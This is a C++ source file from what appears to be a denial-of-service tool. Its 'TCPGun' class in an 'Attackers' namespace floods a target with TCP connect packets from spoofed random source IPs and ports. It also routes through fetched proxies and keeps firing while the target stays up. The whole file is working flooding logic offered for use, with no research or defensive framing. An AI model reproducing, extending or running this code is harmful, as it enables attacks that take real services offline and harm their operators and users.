#include <netdb.h>
#include <netinet/in.h>

#include "spdlog/spdlog.h"

#include "tcp_gun.h"

#include "api_interface.h"
#include "tcp_wrapper.h"
#include "globals.h"
#include "config.h"
#include "utils.h"

using namespace Attackers;

void TCPGun::FireTillDead(const CURI &targetToKill) noexcept
{
	SPDLOG_INFO("Firing at {} without proxy", targetToKill);
	FireWithoutProxy(targetToKill);

	SPDLOG_INFO("Firing at {} with proxy", targetToKill);
	FireWithProxy(targetToKill);
}

std::optional<CURI> TCPGun::Aim(const CURI &uriToAttack) noexcept
{
	Informator informer;
	informer.LoadNewData();

	for(size_t proxyTry = 0; 
		proxyTry < ProxyConfig::PROXY_TRIES; proxyTry++)
	{
		if(const auto proxies = informer.GetProxies())
		{
			if(auto resolvedAddress{m_attacker.CheckConnection(uriToAttack, *proxies)})
			{
				return *resolvedAddress;
			}
		}
		informer.LoadNewData();
	}

	return {};
}
bool TCPGun::FireWithoutProxy(const CURI &targetToKill) noexcept
{
	// Checking connectivity over proxy, because packets would be send with randomized source

	auto resolvedAddress{m_attacker.CheckConnection(targetToKill, {})};
	while(!m_currentTask.ShouldStop())
	{
		if(resolvedAddress && ShootTarget(*resolvedAddress))
		{
			resolvedAddress = m_attacker.CheckConnection(targetToKill, {});
		}
	}
	return false;
}

void TCPGun::FireWithProxy(const CURI &targetToKill) noexcept
{
	Informator informer;
	while(!m_currentTask.ShouldStop() && !informer.LoadNewData())
	{
	}

	std::optional<std::vector<Proxy>> proxies;
	while(!m_currentTask.ShouldStop() && !(proxies = informer.GetProxies()).has_value())
	{
	}

	// Checking connectivity over proxy, because packets would be send with randomized source
	auto resolvedAddress{m_attacker.CheckConnection(targetToKill, *proxies)};
	while(!m_currentTask.ShouldStop() && resolvedAddress)
	{
		SPDLOG_INFO("{} is up", *resolvedAddress);
		ShootTarget(*resolvedAddress);
		resolvedAddress = m_attacker.CheckConnection(targetToKill, *proxies);
	}
}

bool TCPGun::ShootTarget(const CURI &targetToShoot)
{
	size_t count = 0;
	for(; count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK
			&& !m_currentTask.ShouldStop(); count++)
	{
		CURI fakeSource{GetRandomIP()};
		fakeSource.SetPort(GetRandomPort());
		TCPWrapper::TCPStatus sendStatus = m_attacker.SendConnectPacket(fakeSource, targetToShoot);

		if(sendStatus == TCPWrapper::TCPStatus::NeedConnectivityCheck ||
			sendStatus == TCPWrapper::TCPStatus::GotError)
		{
			SPDLOG_WARN("Something went wrong durring sending packet");
			return true;
		}
	}
	SPDLOG_INFO("Already sent: {} packets to {}, rechecking target...", count, 
		targetToShoot);
	return false;
}
